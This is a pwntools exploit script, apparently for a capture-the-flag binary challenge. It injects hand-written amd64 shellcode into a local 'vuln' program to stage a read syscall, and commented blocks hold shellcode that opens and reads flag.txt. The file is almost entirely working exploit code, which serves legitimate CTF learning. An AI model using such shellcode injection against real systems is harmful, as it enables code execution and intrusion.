from pwn import *
context.log_level = 'debug'
context.arch ='amd64'
elf = context.binary = ELF("./vuln",checksec=False)
r = elf.process()
# p = remote(b"ret2win.chal.imaginaryctf.org", 1337)

a=0x6d67-0x6c66
print(hex(a))
b=0x75792f67-0x74782e67
print(hex(b))
shellcode= '''
/* call read(0, 'esp', 0xff) */

mov bl, 1
xchg eax, ebx
mov bl, 1
xchg edi, ebx
mov bl, 0xdf
mov bh, 0x05
lea edx, [ebx]
mov r15, rsp
lea rsi, [r15]
syscall
xor ebx, ebx
xchg eax, ebx
xor ebx, ebx
xchg edi, ebx
syscall
ret

'''


# shellcode =asm(shellcraft.open("flag.txt")+shellcraft.read(0, 'esp', 0xff) + shellcraft.write(0, 'esp', 0xff))

shellcode =asm(shellcode)
print(len(shellcode))
print(disasm(shellcode))


pause()


r.send(shellcode)



r.interactive()

# mov bl, 1
# xchg edi, ebx
# xchg ebx, eax
# pop rdi
# syscall

# mov esp, ebp
# pop ebp

   # 0:   31 c0                   xor    eax, eax
   # 2:   31 ff                   xor    edi, edi
   # 4:   31 d2                   xor    edx, edx
   # 6:   b2 ff                   mov    dl, 0xff
   # 8:   89 e6                   mov    esi, esp
   # a:   0f 05                   syscall

# 0x74782e67616c66
# MOV - Opcode: 89
# ADD - Opcode: 01
# SUB - Opcode: 29
# PUSH - Opcode: 50 to 57
# POP - Opcode: 58 to 5F
# CALL - Opcode: E8
# RET - Opcode: C3
# JMP - Opcode: E9
# CMP - Opcode: 3B
# JE - Opcode: 74
# JNE - Opcode: 75
# AND - Opcode: 21
# OR - Opcode: 09
# XOR - Opcode: 31
# SHR - Opcode: D1
# SHL - Opcode: D1
# SAR - Opcode: D1
# SAL - Opcode: D1


# /* open(file='flag.txt', oflag=0, mode=0) */
# /* push b'flag.txt\x00' */
# push 1
# dec byte ptr [rsp]
# mov rax, 0x7478742e67616c66
# push rax
# mov rdi, rsp
# xor edx, edx /* 0 */
# xor esi, esi /* 0 */
# /* call open() */
# push 2 /* 2 */
# pop rax
# syscall
# /* call read(0, 'esp', 0xff) */
# xor eax, eax /* SYS_read */
# xor edi, edi /* 0 */
# xor edx, edx
# mov dl, 0xff
# mov esi, esp
# syscall
# /* write(fd=0, buf='esp', n=0xff) */
# xor edi, edi /* 0 */
# xor edx, edx
# mov dl, 0xff
# mov esi, esp
# /* call write() */
# push 1 /* 1 */
# pop rax
# syscall